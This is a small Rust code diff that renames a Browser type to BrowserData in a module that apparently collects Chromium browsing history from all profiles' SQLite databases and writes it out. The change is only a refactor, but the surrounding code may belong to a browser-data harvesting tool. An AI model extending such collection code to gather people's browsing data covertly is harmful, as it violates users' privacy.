@@ -1,5 +1,5 @@
 use crate::alloc::borrow::ToOwned;
-use crate::chromium::Browser;
+use crate::chromium::BrowserData;
 use crate::{collect_from_all_profiles, read_sqlite3_and_map_records, to_string_and_write_all, History};
 use alloc::boxed::Box;
 use alloc::sync::Arc;
@@ -14,11 +14,11 @@ const URLS_TITLE: usize = 2;
 const URLS_LAST_VISIT_TIME: usize = 5;
 
 pub(super) struct HistoryTask {
-    browser: Arc<Browser>
+    browser: Arc<BrowserData>
 }
 
 impl HistoryTask {
-    pub(super) fn new(browser: Arc<Browser>) -> Self {
+    pub(super) fn new(browser: Arc<BrowserData>) -> Self {
         Self { browser }
     }
 }
